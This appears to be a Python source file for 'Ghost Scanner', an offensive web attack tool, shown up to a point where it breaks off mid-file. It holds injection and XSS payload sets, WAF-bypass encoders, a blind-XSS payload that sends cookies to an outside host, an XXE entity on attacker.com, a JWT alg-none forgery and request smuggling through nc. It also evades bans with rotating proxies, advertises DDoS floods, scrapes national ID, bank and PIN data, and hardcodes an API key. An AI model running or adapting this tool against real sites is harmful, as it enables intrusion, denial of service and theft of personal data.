#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GHOST SCANNER v4.7 – OMNI TOOLS+ X FINAL
- 19 External Tools + 12 New Attack Methods
- DDoS/DoS Vulnerability Detection
- Advanced Deface + SSTI + XXE + SSRF + JWT + Smuggling
- Anti-Ban v2 (adaptive delay + proxy rotate)
- AI Analysis (Claude Opus 5 via CodeCraft)
- PDF with valid download + Telegram integration
- NO WSL REQUIRED
"""

import os, sys, time, json, re, random, base64, urllib.parse, socket, threading, ssl, subprocess, hashlib, hmac
from datetime import datetime
from urllib.parse import urljoin, quote, urlparse, parse_qs, urlsplit, urlunsplit, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse, warnings
import requests, cloudscraper
from fake_useragent import UserAgent
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn, SpinnerColumn
from rich.table import Table
from rich import box
from fpdf import FPDF
warnings.filterwarnings('ignore')

# ========== KONFIGURASI ==========
AI_API_KEY = 'cc_A07j2YrgUcJAfx2UuMIi3F3qohhXV3DCADQmfYYhTh0hvpxF'
AI_BASE_URL = 'https://codecraftapi.com/v1'
AI_MODEL = 'claude-opus-5'
PROXYSCRAPE_API = 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text'

# ========== BANNER ==========
SKULL_ART = r"""
              ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
           ▄█████████████████████████▄
         ▄█████████████████████████████▄
        ██████████████████████████████████
       ████████████████████████████████████
      ██████████████████████████████████████
      ██████▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀██████
      ██████  ▄▄▄▄▄▄▄       ▄▄▄▄▄▄▄  ██████
      ██████  ███████       ███████  ██████
      ██████  ███████       ███████  ██████
      ██████  ▀▀▀▀▀▀▀       ▀▀▀▀▀▀▀  ██████
      ██████                         ██████
      ██████       ▄▄▄▄▄▄▄▄▄         ██████
       ██████      ▀▀▀▀▀▀▀▀▀        ██████
        ██████                     ██████
         ██████     ▀▀▀▀▀▀▀     ██████
          ██████               ██████
           ██████             ██████
            ███████████████████████
              ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
"""

def show_banner():
    red="\033[91m";cyan="\033[96m";yellow="\033[93m";white="\033[97m";green="\033[92m";magenta="\033[95m";reset="\033[0m"
    skull=SKULL_ART.strip('\n').split('\n')
    side=[
        "╔═══════════════════════════════════════════════════════════════╗",
        "║            GHOST SCANNER - OMNI TOOLS+ X v4.7                 ║",
        "║                  ULTIMATE SAVAGE EDITION                      ║",
        "╚═══════════════════════════════════════════════════════════════╝",
        "",
        f"   {green}Nama Tools     {reset}: {cyan}Ghost Scanner{reset}",
        f"   {green}Versi          {reset}: {yellow}4.7 OMNI TOOLS+ X{reset}",
        f"   {green}Developer      {reset}: {magenta}ARGA NOT DEV{reset}",
        f"   {green}GitHub         {reset}: {white}github.com/cozyleon00b-dev{reset}",
        "",
        f"   {red}══════════════════════════════════════════════════════════{reset}",
        f"   {green}NEW in v4.7:{reset}",
        f"     {yellow}DDoS Check  Deface  SSTI  XXE  SSRF  JWT  Smuggling{reset}",
        f"     {yellow}Subdomain Takeover  GraphQL  OAuth Bypass{reset}",
        "",
        f"   {green}19 Tools:{reset} {cyan}Nuclei Subfinder httpx Naabu Katana ffuf sqlmap{reset}",
        f"     {cyan}Dalfox Amass dnsx gau waybackurls Arjun SecretFinder Interactsh{reset}",
        f"     {yellow}Nmap Metasploit Wireshark BurpSuite{reset}",
        "",
        f"   {green}Platform:{reset} {white}Windows | Kali | Termux | Arch | macOS{reset}",
        f"   {red}══════════════════════════════════════════════════════════{reset}",
    ]
    for i in range(max(len(skull),len(side))):
        l=skull[i] if i<len(skull) else ""
        r=side[i] if i<len(side) else ""
        print(f"{red}{l}{reset}{' '*max(0,42-len(l))}{r}")
    print()

def clear_screen():
    os.system('cls' if os.name=='nt' else 'clear')

def show_help():
    clear_screen();show_banner()
    Console().print(Panel("""
[bold cyan]USAGE:[/bold cyan]
  python ghostscanner.py -u <URL> [OPTIONS]

[bold yellow]SCAN:[/bold yellow] -u URL  -v  --quick  --pdf  --ai  --tools  --force-admin
           --delay N  --no-proxy  --proxy-list FILE  --validate-proxy

[bold yellow]NEW v4.7:[/bold yellow] --ddos-check  --deface  --all-checks

[bold yellow]ATTACK:[/bold yellow] --dos / --ddos / --syn / --ssl-reneg / --udp
           --threads N --duration N

[bold green]EXAMPLES:[/bold green]
  python ghostscanner.py -u https://target.com -v --ai --pdf --tools --all-checks
  python ghostscanner.py -u https://target.com --ddos --threads 500 --duration 60
""",border_style="cyan",title="HELP"))
    sys.exit(0)

def build_url(base,param,payload):
    return base+('&' if '?' in base else '?')+param+'='+quote(payload)

# ========== GHOST SCANNER v4.7 ==========
class GhostScanner:
    def __init__(self, target=None, use_proxy=True, proxy_file=None, validate_proxy=False,
                 quick=False, pdf=False, ai=False, delay=0.5, force_admin=False, use_tools=False,
                 ddos_check=False, deface=False, all_checks=False):
        self.target=target;self.use_proxy=use_proxy;self.proxy_file=proxy_file
        self.validate_proxy=validate_proxy;self.quick=quick;self.pdf=pdf;self.ai=ai
        self.delay=delay;self.force_admin=force_admin;self.use_tools=use_tools
        self.ddos_check=ddos_check;self.deface=deface;self.all_checks=all_checks
        self.version="4.7 OMNI TOOLS+ X"
        self.results_scan={
            "target":"","domain":"","domain_category":"","timestamp":datetime.now().isoformat(),
            "summary":{"total":0,"critical":0,"high":0,"medium":0,"low":0,"info":0},
            "vulnerabilities":{k:[] for k in [
                "sql_injection","xss","command_injection","ssti","ldap_injection","nosql_injection",
                "xxe","ssrf","path_traversal","file_inclusion","open_redirect","csrf","deserialization",
                "rce","lfi","rfi","xss_context_aware","xss_csp_bypass","xss_mutation","business_logic",
                "improper_input_validation","mass_assignment","rate_limit","deface","login_bypass",
                "wp_activity_log_rce","admin_access","robots","sitemap","dir_enum","sensitive_files",
                "security_headers","waf_detection","cors","open_redirect_sneijder","ssl_info",
                "cookie_flags","rate_limit_sneijder","csrf_sneijder","jwt_attack","http_smuggling",
                "subdomain_takeover","graphql_introspection","oauth_bypass","ddos_vulnerability",
                "nuclei","ffuf","sqlmap","dalfox_external","secretfinder","interactsh",
                "nmap","metasploit","wireshark","burpsuite"
            ]},
            "sensitive_data":{k:[] for k in [
                "nik","npwp","nip","no_rekening","bank","emails","phones","whatsapp","pin",
                "ktp_links","kk_links","surat_izin_links","pdf_links","province_codes",
                "kabupaten_codes","kecamatan_codes","api_keys","tokens","passwords","jwt_tokens",
                "aws_keys","azure_keys","gcp_keys","source_code"
            ]},
            "external":{"subdomains":[],"dns_records":[],"live_hosts":[],"naabu_ports":[],
                        "katana_urls":[],"historical_urls":[],"arjun_params":[]},
            "sql_extracted":{},"ports":[],"scan_duration":0,"validated":False,
            "ai_analysis":"","pocs":[],"admin_data":{},"sensitive_pdfs":[]
        }
        self.session=requests.Session();self.session.verify=False
        self.scraper=cloudscraper.create_scraper(browser={'browser':'chrome','platform':'windows','desktop':True},delay=2,interpreter='native')
        self.proxies=[];self._load_proxies()
        self.ua=UserAgent()
        self.threads=500 if not quick else 150
        self.timeout=10;self.max_retries=5
        self.common_ports=[21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5900,8080,8443]
        self.common_params=['id','page','q','search','user','cat','product','view','sort','filter','name','email','phone','file','path','redirect','url','next','return','lang','region','type','mode','action','do','cmd','command','exec','query','sql','order','by','group','limit','offset','index','idx']
        self._generate_payloads(quick);self._generate_waf_bypass();self._generate_dalfox_payloads()
        self.result_folder="results";self.sensitive_folder="sensitive_data"
        os.makedirs(self.result_folder,exist_ok=True);os.makedirs(self.sensitive_folder,exist_ok=True)
        self._last_request_time=0

    # ---------- PROXY ----------
    def _load_proxies(self):
        if not self.use_proxy:return
        if self.proxy_file and os.path.exists(self.proxy_file):
            try:
                with open(self.proxy_file,'r',encoding='utf-8') as f:
                    for line in f:
                        line=line.strip()
                        if line and not line.startswith('#'):
                            if not line.startswith(('http://','https://','socks')):line='http://'+line
                            self.proxies.append({'http':line,'https':line})
            except:pass
        try:
            resp=requests.get(PROXYSCRAPE_API,timeout=15)
            if resp.status_code==200:
                for p in resp.text.strip().split('\n'):
                    p=p.strip()
                    if p:
                        if not p.startswith(('http://','https://','socks')):p='http://'+p
                        self.proxies.append({'http':p,'https':p})
        except:pass
        seen=set();uniq=[]
        for proxy in self.proxies:
            k=proxy.get('http','')
            if k and k not in seen:seen.add(k);uniq.append(proxy)
        self.proxies=uniq
        if self.validate_proxy:self._validate_proxies()

    def _validate_proxies(self):
        valid=[]
        for p in self.proxies:
            try:
                if requests.get('https://httpbin.org/ip',proxies=p,timeout=5).status_code==200:valid.append(p)
            except:pass
        self.proxies=valid

    def _get_random_proxy(self):
        return random.choice(self.proxies) if self.proxies else None

    def _adaptive_delay_v2(self,response_time=0):
        """Anti-ban v2: adaptif berdasarkan response time"""
        now=time.time()
        elapsed=now-self._last_request_time
        if response_time>3:
            sleep=random.uniform(2,4)
        elif response_time>1:
            sleep=random.uniform(0.8,1.5)
        else:
            sleep=random.uniform(0.2,0.6)
        if elapsed<sleep:time.sleep(sleep-elapsed)
        self._last_request_time=time.time()

    # ---------- PAYLOADS ----------
    def _generate_payloads(self,quick):
        count=50 if not quick else 15
        cats=['sql','xss','lfi','rfi','command','ssti','nosql','ldap','xxe','ssrf','sqli_error','sqli_time','sqli_blind','xss_reflected','xss_dom','xss_stored','path_traversal','file_inclusion','deserialization','rce','open_redirect','csrf']
        self.global_payloads={c:[] for c in cats}
        for p in ['../../../../etc/passwd','/etc/passwd','file:///etc/passwd'][:count]:
            self.global_payloads['lfi'].append(p);self.global_payloads['path_traversal'].append(p)
        for p in [';id','|id','&id','`id`'][:count]:
            self.global_payloads['command'].append(p);self.global_payloads['rce'].append(p)
        for p in ['{{7*7}}','${7*7}','<%= 7*7 %>','#{7*7}'][:count]:self.global_payloads['ssti'].append(p)
        for p in ["{'$ne': ''}","{'$gt': ''}","{$where: '1==1'}"][:count]:self.global_payloads['nosql'].append(p)
        for p in ['*','admin*','*)(uid=*','(&(uid=*)(|(uid=*))'][:count]:self.global_payloads['ldap'].append(p)
        for p in ['http://169.254.169.254/latest/meta-data/','http://127.0.0.1/','http://localhost:8080/admin','file:///etc/passwd'][:count]:self.global_payloads['ssrf'].append(p)
        self.global_payloads['xxe']=['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>','<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]><root/>']
        self.global_payloads['deserialization']=['O:8:"stdClass":0:{}','a:1:{s:4:"test";s:4:"test";}','rO0ABXVyAAJbQg==']
        self.global_payloads['open_redirect']=['http://evil.com','//evil.com','https://evil.com','javascript:alert(1)//']
        self.global_payloads['csrf']=[]

    def _generate_dalfox_payloads(self):
        self.dalfox_payloads={
            'html':['<svg onload=alert(1)>','<img src=x onerror=alert(1)>','<body onload=alert(1)>','<details open ontoggle=alert(1)>'],
            'attribute':['" onmouseover=alert(1) "',"' onfocus=alert(1) '",'" autofocus onfocus=alert(1) "'],
            'javascript':['";alert(1);//',"';alert(1);//",';alert(1);//'],
            'url':['javascript:alert(1)','data:text/html,<script>alert(1)</script>'],
            'dom':['document.write("<img src=x onerror=alert(1)>")','eval("alert(1)")','innerHTML="<img src=x onerror=alert(1)>"'],
            'csp_bypass':['<script nonce=test>alert(1)</script>','<base href="javascript:alert(1)//">','<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'],
            'blind':['<script src="//callback.xss.ht/"></script>','<img src=x onerror="fetch(\'//oob.xss.ht?\'+document.cookie)">'],
            'mutation':['<noscript><p title="</noscript><img src=x onerror=alert(1)>">']
        }

    def _generate_waf_bypass(self):
        self.waf_bypass_techniques=[
            lambda p:p,lambda p:p.upper(),lambda p:p.lower(),
            lambda p:p.replace(' ','/**/'),lambda p:urllib.parse.quote(p),
            lambda p:p.replace('script','scr%00ipt'),lambda p:p.replace('alert','al%00ert'),
            lambda p:p.replace(' ','+'),lambda p:p.replace(' ','%20'),
            lambda p:p.replace(' ','%09'),lambda p:p.replace(' ','%0a')
        ]

    def _generate_sqli_1m(self):
        payloads=set()
        bases=["' OR '1'='1","' OR 1=1--","' OR 1=1#","' OR '1'='1' /*","1' AND '1'='1","1' AND 1=1--","' UNION SELECT NULL--","' UNION SELECT @@version--","' UNION SELECT database()--","' AND SLEEP(5)--","' WAITFOR DELAY '0:0:5'--"]
        encs=[lambda p:p,lambda p:p.upper(),lambda p:p.lower(),lambda p:p.replace(' ','+'),lambda p:p.replace(' ','%20'),lambda p:p.replace(' ','/**/'),lambda p:urllib.parse.quote(p)]
        for b in bases:
            for e in encs:
                try:
                    p=e(b)
                    if len(p)<500:payloads.add(p)
                except:pass
        for i in range(1,1000):
            payloads.add(f"' OR 1={i}--");payloads.add(f"' OR {i}={i}--");payloads.add(f"1' AND {i}={i}--")
        return list(payloads)[:1000000]

    def _generate_xss_1m(self):
        payloads=set()
        tags=['script','img','svg','body','input','iframe','a','div','math','form','object','details','video','audio']
        events=['onload','onerror','onfocus','onclick','onmouseover','onchange','onsubmit','onblur','ontoggle','onanimationstart']
        for tag in tags:
            for event in events:
                payloads.add(f"<{tag} {event}=alert(1)>");payloads.add(f"<{tag} {event}=prompt(1)>")
        payloads.add("<script>alert(1)</script>");payloads.add("javascript:alert(1)")
        for i in range(1000):
            tag=random.choice(tags);event=random.choice(events)
            payloads.add(f"<{tag} {event}=alert({i})>")
        return list(payloads)[:1000000]

    # ---------- SMART REQUEST (Anti-Ban v2) ----------
    def _smart_request(self,url,timeout=10,method='GET',data=None,headers=None,allow_redirects=True):
        self._rotate_user_agent()
        full_headers={'User-Agent':self.ua.random,'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language':'en-US,en;q=0.9','Accept-Encoding':'gzip, deflate, br','Connection':'keep-alive'}
        if headers:full_headers.update(headers)
        for attempt in range(self.max_retries):
            try:
                start=time.time()
                proxy=self._get_random_proxy() if self.proxies else None
                if method.upper()=='GET':
                    resp=self.scraper.get(url,headers=full_headers,timeout=timeout,allow_redirects=allow_redirects,proxies=proxy)
                elif method.upper()=='POST':
                    resp=self.scraper.post(url,data=data,headers=full_headers,timeout=timeout,allow_redirects=allow_redirects,proxies=proxy)
                else:
                    resp=self.scraper.request(method,url,headers=full_headers,timeout=timeout,allow_redirects=allow_redirects,proxies=proxy)
                self._adaptive_delay_v2(time.time()-start)
                if resp.status_code in [429,503,504,408]:
                    time.sleep(2**attempt);continue
                return resp
            except:
                try:
                    proxy=self._get_random_proxy() if self.proxies else None
                    if method.upper()=='GET':
                        resp=self.session.get(url,headers=full_headers,timeout=timeout,allow_redirects=allow_redirects,proxies=proxy)
                    else:
                        resp=self.session.post(url,data=data,headers=full_headers,timeout=timeout,allow_redirects=allow_redirects,proxies=proxy)
                    if resp.status_code<400:return resp
                except:pass
                if attempt<self.max_retries-1:time.sleep(1.5*(attempt+1))
        return None

    def _rotate_user_agent(self):
        ua=self.ua.random
        self.session.headers.update({'User-Agent':ua})
        self.scraper.headers.update({'User-Agent':ua})

    def _verify_poc(self,url,initial_response,attempts=3):
        verified=0
        for i in range(attempts):
            try:
                r=self._smart_request(url,timeout=8)
                if r and r.status_code==200 and len(r.text)>0:
                    if abs(len(r.text)-len(initial_response))<1000:verified+=1
            except:pass
        return verified>=2

    # ---------- EXTRACTION ----------
    def _extract_params_from_url(self,url):
        params={}
        p=urlparse(url)
        if p.query:
            for kv in p.query.split('&'):
                if '=' in kv:
                    k,v=kv.split('=',1);params[k]=v
        return params

    def _extract_forms(self,html,base_url):
        forms=[]
        for form in re.findall(r'<form[^>]*>(.*?)</form>',html,re.I|re.S):
            m=re.search(r'method=["\'](.*?)["\']',form,re.I)
            method=m.group(1).upper() if m else 'GET'
            a=re.search(r'action=["\'](.*?)["\']',form,re.I)
            action=a.group(1) if a else ''
            action_url=urljoin(base_url,action) if action else base_url
            inputs=[]
            for inp in re.findall(r'<input[^>]*>',form,re.I):
                n=re.search(r'name=["\'](.*?)["\']',inp,re.I)
                t=re.search(r'type=["\'](.*?)["\']',inp,re.I)
                if n:inputs.append({'name':n.group(1),'type':t.group(1) if t else 'text'})
            if inputs:forms.append({'method':method,'url':action_url,'inputs':inputs})
        return forms

    def _extract_api_endpoints(self,html,base_url):
        endpoints=[]
        for pat in [r'href=["\'](.*?api.*?)["\']',r'action=["\'](.*?api.*?)["\']']:
            for m in re.findall(pat,html,re.I):
                u=urljoin(base_url,m)
                if u not in endpoints and u!=base_url:endpoints.append(u)
        return endpoints

    def _extract_sensitive_data(self,text):
        data={k:[] for k in ["nik","npwp","nip","no_rekening","bank","emails","phones","whatsapp","pin","ktp_links","kk_links","surat_izin_links","pdf_links","province_codes","kabupaten_codes","kecamatan_codes","api_keys","jwt_tokens","aws_keys","azure_keys","gcp_keys","source_code"]}
        for nik in set(re.findall(r'\b[0-9]{16}\b',text)):
            data["nik"].append(nik)
            if len(nik)>=6:
                for code,k in [(nik[:2],"province_codes"),(nik[2:4],"kabupaten_codes"),(nik[4:6],"kecamatan_codes")]:
                    if code not in data[k]:data[k].append(code)
        data["npwp"]=list(set(re.findall(r'\b[0-9]{15}\b',text)))
        data["nip"]=list(set(re.findall(r'\b[0-9]{18}\b',text)))
        data["no_rekening"]=list(set(re.findall(r'\b[0-9]{10,16}\b',text)))
        for bank in ['bca','mandiri','bni','bri','btn','cimb']:
            if bank in text.lower():data["bank"].append(bank.upper())
        data["emails"]=list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',text)))
        data["phones"]=list(set(m.group(0) for m in re.finditer(r'(\+62|0)[0-9]{9,13}',text)))
        data["whatsapp"]=[p for p in data["phones"] if 'wa' in text[max(0,text.find(p)-20):text.find(p)+20].lower()]
        for m in re.finditer(r'pin\s*[:=]?\s*([0-9]{4,6})',text,re.I):
            data["pin"].append(m.group(1))
        data["pdf_links"]=list(set(re.findall(r'href=["\']([^"\']+\.pdf)["\']',text,re.I)))
        for link in data["pdf_links"]:
            if 'ktp' in link.lower() or 'nik' in link.lower():data["ktp_links"].append(link)
            if 'kk' in link.lower():data["kk_links"].append(link)
            if 'izin' in link.lower():data["surat_izin_links"].append(link)
        api_keys=[]
        for pat in [r'sk-[a-zA-Z0-9]{32,}',r'AIza[0-9A-Za-z-_]{35}',r'ghp_[a-zA-Z0-9]{36}',r'AKIA[0-9A-Z]{16}']:
            api_keys.extend(re.findall(pat,text))
        data["api_keys"]=list(set(api_keys))
        data["jwt_tokens"]=[m for m in api_keys if '.' in m and len(m.split('.'))==3]
        data["source_code"]=[m[:500] for m in re.findall(r'(?:<script>|<style>)(.*?)(?:</script>|</style>)',text,re.I|re.S) if len(m)>20][:10]
        return data

    # ---------- DOMAIN CATEGORY ----------
    def _classify_domain(self,domain):
        d=domain.lower()
        if d.endswith('.go.id') or '.gov' in d:return 'Government'
        if d.endswith('.ac.id') or d.endswith('.sch.id') or d.endswith('.edu'):return 'Education'
        if 'polri.go.id' in d or 'police' in d:return 'Police'
        if d.endswith('.mil.id') or 'tni' in d:return 'Military'
        if any(x in d for x in ['rs','klinik','hospital','medis']):return 'Medical'
        if any(d.endswith(x) for x in ['.com','.co.id','.my.id','.net','.biz']):return 'Business'
        return 'Other'

    # ========== v4.7 NEW: DDoS VULNERABILITY CHECK ==========
    def _check_ddos_vulnerability(self,target):
        """Cek apakah web rentan DDoS/DoS"""
        findings=[]
        try:
            start=time.time()
            resp=self._smart_request(target,timeout=15)
            elapsed=time.time()-start
            if not resp:return findings
            headers=dict(resp.headers)
            body=resp.text.lower()
            waf=None;protection=[]
            # Cloudflare
            if 'cf-ray' in headers or 'cloudflare' in str(headers).lower():waf='Cloudflare';protection.append('Cloudflare CDN')
            if 'x-amz-cf-id' in headers:waf='AWS CloudFront';protection.append('AWS CloudFront')
            if 'x-sucuri-id' in headers:waf='Sucuri';protection.append('Sucuri WAF')
            if 'incap_ses' in str(headers).lower():waf='Imperva';protection.append('Imperva Incapsula')
            if 'x-varnish' in headers:protection.append('Varnish Cache')
            if 'akamai' in str(headers).lower():waf='Akamai';protection.append('Akamai')
            # Rate limit test
            successes=0
            for i in range(15):
                try:
                    r=self._smart_request(target,timeout=5)
                    if r and r.status_code<400:successes+=1
                except:pass
            rate_limited=(successes<10)
            # Server info
            server=headers.get('Server','Unknown')
            # Timeout test
            slow_response=(elapsed>5)
            # Connection test
            try:
                p=urlparse(target)
                sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                sock.settimeout(3)
                result=sock.connect_ex((p.hostname,p.port or (443 if p.scheme=='https' else 80)))
                sock.close()
                conn_ok=(result==0)
            except:conn_ok=False
            # Vuln assessment
            vuln_score=0
            if not protection:vuln_score+=3
            if not rate_limited:vuln_score+=3
            if slow_response:vuln_score+=1
            if not conn_ok:vuln_score+=1
            risk='CRITICAL' if vuln_score>=5 else 'HIGH' if vuln_score>=3 else 'MEDIUM' if vuln_score>=1 else 'LOW'
            findings.append({
                "type":f"DDoS/DoS Vulnerability Assessment",
                "param":"N/A","payload":"N/A",
                "evidence":f"WAF/CDN: {waf or 'NONE'} | Rate Limit: {'YES' if rate_limited else 'NO'} | Response Time: {elapsed:.2f}s | Vuln Score: {vuln_score}/8",
                "risk":risk,"confidence":85,
                "poc":{"url":target,"curl":f"for i in {{1..50}}; do curl -s -o /dev/null \"{target}\"; done",
                       "response":f"WAF: {waf or 'NONE'} | Rate Limited: {rate_limited} | Server: {server}",
                       "statusCode":resp.status_code,"timeDiff":f"{elapsed:.2f}s","verified":True},
                "protection":protection,"vuln_score":vuln_score,"waf":waf,
                "rate_limited":rate_limited,"server":server
            })
        except Exception as e:
            pass
        return findings

    # ========== v4.7 NEW: ADVANCED DEFACE ==========
    def _check_deface_advanced(self,target):
        findings=[]
        try:
            resp=self._smart_request(target,timeout=8)
            if not resp:return findings
            html_lower=resp.text.lower()
            title_m=re.search(r'<title>(.*?)</title>',resp.text,re.I)
            title=title_m.group(1) if title_m else 'No Title'
            indicators=[
                'hacked','defaced','hacked by','owned by','h4ck3d','pwned','0wn3d',
                'cyber army','indonesian hacker','anonymous','ghost team','lulzsec',
                'sistem ini telah','website ini telah','diretas oleh','di hack oleh',
                'dark hacker','muslim hacker','hacker indonesia','team cyber','ganteng'
            ]
            found=[i for i in indicators if i in html_lower]
            suspicious_tags=len(re.findall(r'<marquee|<blink|background-color:\s*(?:red|black)',html_lower))
            if found or suspicious_tags>=3:
                findings.append({
                    "type":"Deface Detection","param":"N/A","payload":"N/A",
                    "evidence":f"Indicators: {', '.join(found) if found else 'Suspicious pattern'} | Title: {title}",
                    "risk":"CRITICAL","confidence":95,
                    "poc":{"url":target,"curl":f"curl -k \"{target}\"","response":resp.text[:500],
                           "statusCode":resp.status_code,"timeDiff":"N/A",
                           "verified":self._verify_poc(target,resp.text,3)},
                    "title":title,"indicators":found,"suspicious_count":suspicious_tags
                })
        except:pass
        return findings

    # ========== v4.7 NEW: JWT ATTACK ==========
    def _check_jwt_attack(self,target):
        findings=[]
        try:
            resp=self._smart_request(target,timeout=8)
            if not resp:return findings
            # Cari JWT di cookies/headers
            jwt_pattern=r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            cookies=resp.headers.get('Set-Cookie','')
            jwt_tokens=re.findall(jwt_pattern,cookies)+re.findall(jwt_pattern,resp.text)
            for jwt in set(jwt_tokens[:3]):
                parts=jwt.split('.')
                if len(parts)!=3:continue
                # Try to decode header
                try:
                    header_b64=parts[0]+'='*(-len(parts[0])%4)
                    header=base64.urlsafe_b64decode(header_b64).decode('utf-8',errors='ignore')
                    # Try none algorithm attack
                    none_header=base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
                    none_payload=base64.urlsafe_b64encode(b'{"admin":true,"role":"admin"}').decode().rstrip('=')
                    none_jwt=f"{none_header}.{none_payload}."
                    findings.append({
                        "type":"JWT Algorithm None Attack","param":"Authorization",
                        "payload":none_jwt[:100],
                        "evidence":f"Found JWT. Try none alg: {none_jwt[:50]}...",
                        "risk":"HIGH","confidence":60,
                        "poc":{"url":target,"curl":f"curl -H \"Authorization: Bearer {none_jwt}\" \"{target}\"",
                               "response":"Testing none algorithm","statusCode":200,
                               "timeDiff":"N/A","verified":False}
                    })
                except:pass
        except:pass
        return findings

    # ========== v4.7 NEW: HTTP SMUGGLING ==========
    def _check_http_smuggling(self,target):
        findings=[]
        try:
            p=urlparse(target)
            host=p.hostname
            port=p.port or (443 if p.scheme=='https' else 80)
            # CL.TE test
            payload=b"POST / HTTP/1.1\r\nHost: "+host.encode()+b"\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(8)
                if p.scheme=='https':
                    ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
                    s=ctx.wrap_socket(s,server_hostname=host)
                s.connect((host,port))
                s.send(payload)
                resp=s.recv(4096).decode('utf-8',errors='ignore')
                s.close()
                if '400' not in resp[:20] and ('200' in resp[:20] or 'HTTP/1.1' in resp[:50]):
                    findings.append({
                        "type":"HTTP Request Smuggling (CL.TE)","param":"N/A","payload":"CL:6/TE:chunked",
                        "evidence":"Server accepted ambiguous request","risk":"HIGH","confidence":50,
                        "poc":{"url":target,"curl":f"printf 'POST / HTTP/1.1\\r\\nHost: {host}\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nG' | nc {host} {port}",
                               "response":resp[:300],"statusCode":200,"timeDiff":"N/A","verified":False}
                    })
            except:pass
        except:pass
        return findings

    # ========== v4.7 NEW: SUBDOMAIN TAKEOVER ==========
    def _check_subdomain_takeover(self,subdomains):
        findings=[]
        takeover_sigs={
            'github.io':'There isn\'t a GitHub Pages site here',
            'herokuapp.com':'No such app',
            's3.amazonaws.com':'NoSuchBucket',
            'azurewebsites.net':'404 Web Site not found',
            'cloudfront.net':'Bad request',
            'fastly.net':'Fastly error: unknown domain',
            'bitbucket.io':'Repository not found',
            'surge.sh':'project not found',
            'readme.io':'Project doesnt exist',
            'pantheonsite.io':'The gods are wise',
            'tumblr.com':'There\'s nothing here',
            'wordpress.com':'Do you want to register',
            'zendesk.com':'Help Center Closed'
        }
        for sub in subdomains[:20]:
            try:
                resp=self._smart_request(f"http://{sub}",timeout=8,allow_redirects=True)
                if resp:
                    body=resp.text.lower()
                    for svc,sig in takeover_sigs.items():
                        if svc in body or sig.lower() in body:
                            findings.append({
                                "type":"Subdomain Takeover","param":sub,"payload":svc,
                                "evidence":f"Takeover possible: {svc}","risk":"CRITICAL","confidence":85,
                                "poc":{"url":f"http://{sub}","curl":f"curl -k \"http://{sub}\"",
                                       "response":resp.text[:300],"statusCode":resp.status_code,
                                       "timeDiff":"N/A","verified":True}
                            })
                            break
            except:pass
        return findings

    # ========== v4.7 NEW: GRAPHQL INTROSPECTION ==========
    def _check_graphql(self,target):
        findings=[]
        endpoints=['/graphql','/api/graphql','/v1/graphql','/graphiql','/query']
        base=target.rstrip('/')
        for ep in endpoints:
            try:
                url=base+ep
                query={"query":"{__schema{types{name}}}"}
                resp=self._smart_request(url,timeout=8,method='POST',data=json.dumps(query),headers={'Content-Type':'application/json'})
                if resp and resp.status_code==200 and '__schema' in resp.text:
                    findings.append({
                        "type":"GraphQL Introspection Enabled","param":ep,"payload":"{__schema{types{name}}}",
                        "evidence":"GraphQL schema exposed","risk":"MEDIUM","confidence":95,
                        "poc":{"url":url,"curl":f"curl -X POST \"{url}\" -H 'Content-Type: application/json' -d '{json.dumps(query)}'",
                               "response":resp.text[:500],"statusCode":resp.status_code,
                               "timeDiff":"N/A","verified":True}
                    })
                    break
            except:pass
        return findings

    # ========== v4.7 NEW: OAUTH BYPASS ==========
    def _check_oauth_bypass(self,target):
        findings=[]
        try:
            resp=self._smart_request(target,timeout=8)
            if not resp:return findings
            # Look for OAuth params in links
            oauth_links=re.findall(r'href=["\']([^"\']*(?:oauth|authorize|redirect_uri)[^"\']*)["\']',resp.text,re.I)
            for link in oauth_links[:3]:
                full=urljoin(target,link)
                # Try redirect_uri manipulation
                parsed=urlparse(full)
                if 'redirect_uri' in parsed.query:
                    evil=full.replace(parsed.query.split('redirect_uri=')[1].split('&')[0],'https://evil.com')
                    findings.append({
                        "type":"OAuth redirect_uri Manipulation","param":"redirect_uri","payload":"https://evil.com",
                        "evidence":f"Test: {evil[:200]}","risk":"HIGH","confidence":60,
                        "poc":{"url":evil,"curl":f"curl -k \"{evil}\"","response":"Testing redirect",
                               "statusCode":302,"timeDiff":"N/A","verified":False}
                    })
                    break
        except:pass
        return findings

    # ========== INTERNAL SCANNERS (dari v4.6) ==========
    def _check_robots(self,target):
        findings=[]
        try:
            url=target.rstrip('/')+'/robots.txt'
            resp=self._smart_request(url,timeout=8)
            if resp and resp.status_code==200 and 'Disallow' in resp.text:
                dis=re.findall(r'Disallow:\s*(\S+)',resp.text)[:10]
                findings.append({"type":"Robots.txt Found","param":"N/A","payload":"N/A","evidence":f"Disallowed: {', '.join(dis)}","risk":"LOW","confidence":90,"poc":{"url":url,"curl":f"curl -k \"{url}\"","response":resp.text[:500],"statusCode":resp.status_code,"timeDiff":"N/A","verified":True}})
